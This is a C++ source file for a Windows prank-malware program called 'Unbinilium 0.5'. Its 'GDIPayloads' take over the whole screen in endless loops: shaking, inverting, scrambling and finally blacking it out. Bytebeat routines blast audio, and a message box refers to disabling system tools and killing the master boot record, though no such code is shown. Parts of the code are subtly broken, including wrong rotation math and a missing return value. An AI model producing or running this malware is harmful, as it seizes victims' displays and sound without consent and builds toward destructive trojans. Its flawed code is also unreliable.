typedef struct IUnknown IUnknown;

#pragma once
#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )
#pragma warning( disable: 4003 )
#pragma warning( push, 0 )

#include <windows.h> 
#include <stdio.h>
#include <math.h>
#include <commctrl.h>
#pragma warning( pop )
#include <gdiplus.h>
#include <intrin.h>
#include <winternl.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

FLOAT WINAPI LogizePoints(LPPOINT lpPoint, INT count, FLOAT fAngle, POINT pCenter) {
  for (INT t = 0; t < count; t++) {
    FLOAT x = lpPoint[t].x - pCenter.x;
    FLOAT y = lpPoint[t].y - pCenter.y;
    lpPoint[t].x = static_cast<int>(x * cos(fAngle) - y * cos(fAngle) + pCenter.x);
    lpPoint[t].y = static_cast<int>(y * sin(fAngle) + x * sin(fAngle) + pCenter.y);
  }
}

namespace System
{
        DWORD CALLBACK Redraw(LPVOID lpvd) {
	      while (true) {
		    Sleep(500);
		    RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE|RDW_ERASE|RDW_ALLCHILDREN);
	    }
	}
}
namespace GDIPayloads 
{
  DWORD WINAPI Shake(LPVOID lpvd)
	{
	HDC hdc;
	while (true) {
		hdc = GetDC(0);
		BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
    }
    DWORD WINAPI EllipsePatShake(LPVOID lpvd)
	  {
		CreateThread(NULL, 0, System::Redraw, NULL, 0, 0);
		while (true) {
			HDC hdc = GetDC(0);
			HBRUSH hbsh = CreateSolidBrush(RGB(rand() % 0xff, rand() % 0xff, rand() % 0xff));
			SelectObject(hdc, hbsh);
			PatBlt(hdc, 0, 0, w, h, PATINVERT);
			BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, SRCCOPY);
			int randx = rand() % w, randy = rand() % h;
			Ellipse(hdc, randx, randy, randx+100, randy+100);
			ReleaseDC(0, hdc);
			Sleep(10);
		}
	}
  DWORD WINAPI Payload2(LPVOID lpvd)
	{
	HDC hdc;
	HBRUSH hbsh;
	while (true) {
		hdc = GetDC(0);
		hbsh = CreateSolidBrush(PALETTERGB(rand() % 255, rand() % 255, rand() % 255));
		StretchBlt(hdc, 0, 0, w, h, hdc, w/2, 0, -w, h, NOTSRCERASE);
		StretchBlt(hdc, 0, 0, w, h, hdc, 0, h/2, w, -h, NOTSRCCOPY);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCAND);
		SelectObject(hdc, hbsh);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
  }
	DWORD WINAPI Shake2(LPVOID lpvd)
	{
    HDC hdc;
    double angle = 0.0;
    int xadd, yadd; // x angle and y angle
    while (1) {
        hdc = GetDC(NULL);
        xadd = cos(angle) * 10, yadd = tan(angle) * 20;
        BitBlt(hdc, xadd, yadd, w, h, hdc, 0, 0, SRCINVERT);
        angle += M_PI / 18;
        ReleaseDC(NULL, hdc);
        Sleep(10);
   }
   }
  DWORD WINAPI RadiusIcon(LPVOID lpvd)
	{
		HDC hdc = GetDC(0);
		HICON hicon = LoadCursorA(NULL, IDC_APPSTARTING);
		double radius = 0.0;
		while (true) {
			POINT cpt;
			GetCursorPos(&cpt);
			int lx = (cos(radius) * 100) + cpt.x, ly = (tan(radius) * 100) + cpt.y;
			DrawIcon(hdc, lx, ly, hicon);
			DrawIcon(hdc, lx-20, ly-20, hicon);
			DrawIcon(hdc, lx-40, ly-40, hicon);
			radius += 2;
			Sleep(10);
		}
		ReleaseDC(0, hdc);
	    }
	  DWORD WINAPI Rotozoomer(LPVOID lpvd)
     {
		HDC hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
		int wp = w/5, hp = h/5;
		BITMAPINFO bmp = { sizeof(bmp), wp, hp, 1, 32, BI_RGB };
		RGBQUAD* rgbquad;
		HBITMAP hbit = CreateDIBSection(hdc, &bmp, DIB_RGB_COLORS, (LPVOID*)&rgbquad, NULL, 0);
		SelectObject(mdc, hbit);
		int t = 0;
		double angle = 0.0;
		while (true) {
			StretchBlt(mdc, 0, 0, wp, hp, hdc, 0, 0, w, h, SRCCOPY);
			for (int x = 0; x < wp; x++) {
				for (int y = 0; y < hp; y++) {
					int cx = (x - (wp / 2)),
					cy = (y - (hp / 2));
					int index = y * wp + x;
					int zx = cos(angle) * cx - sin(angle) * cy;
					int zy = sin(angle) * cx + cos(angle) * cy;
					int preset = (zx+t)*(zy+t);
					RGBQUAD mrgbq;
					rgbquad[index].rgbRed = preset;
					rgbquad[index].rgbGreen = preset;
					rgbquad[index].rgbBlue = preset;
				}
			}
			t++;
			angle += 0.01;
			StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, wp, hp, SRCCOPY);
			Sleep(10);
		}
		return 0;
	}
  DWORD WINAPI TriangleMoving(LPVOID lpvd) {
  INT signx = 1, signy = 1;
  INT increment = 10;
  INT x = 10, y = 10;
  FLOAT rotate = 0.0;
  HDC hdc = GetDC(0);
  while (TRUE) {
    x += increment * signx;
    y += increment * signy;
    POINT polyPoints[3]; 
    for (INT t = 0; t < 3; t++) {
      int cx = x + 200, cy = y + 200, radius = 100;
      DOUBLE angle = 2.0 * M_PI * t / 3;
      polyPoints[t].x = cx + static_cast<int>(radius * cos(angle));
      polyPoints[t].y = cy + static_cast<int>(radius * sin(angle));
    }
    POINT center = {(x + (x + 200)) / 2, (y + (y + 200)) / 2};
    LogizePoints(polyPoints, 3, rotate, center);
    HBRUSH hbsh = CreateSolidBrush(RGB(10, 255, 110));
    SelectObject(hdc, hbsh);
    Polygon(hdc, polyPoints, 3);
    if (x > w) signx = -1;
    if (y > h) signy = -1;
    if (x == 0) signx = 1;
    if (y == 0) signy = 1;
    rotate += 0.03;
    Sleep(10);
 }
   ReleaseDC(0, hdc);
}
VOID End(VOID)
{
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, BLACKNESS);
		ReleaseDC(0, hdc);
	}
}
}
namespace Bytebeat
{
    VOID BB1(VOID) {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 15] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t^t*(t>>11))&135);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
    }
	VOID BB2(VOID) {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44000, 44000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[44000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t*t>>9|t)-t)/4);

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
    }
    VOID BB3(VOID) {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 30000, 30000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[30000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t^8|t^7)/0x10048);

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
    }
	VOID BB4(VOID) {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 30000, 30000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[30000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t>>3)*(t>>9)^t); 

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
    }

}
     	WINBOOL CheckForWindowsXP() {
    	OSVERSIONINFOA osvi;
	    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
	    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	    GetVersionExA(&osvi);
	    if (osvi.dwMajorVersion == 5) {
		  return true;
	    }
	    return false;
        }
        void NotWindowsXP() {
    	  MessageBoxA(NULL, "Failed to execute Unbinilium 0.5, This can only be ran on XP.", "Unbinilium 0.5.exe - Compatibility Error", MB_ICONWARNING|MB_OK);
    	  exit(0);
        }
        DWORD WINAPI Error(LPVOID lpvd){
    	  MessageBoxA(NULL, "Oh fuck... I cannot disable system tools and kill the MBR. Please hang me now.", "Unbinilium 0.5.exe", MB_ICONWARNING|MB_OK);
    	  return 0;
        }

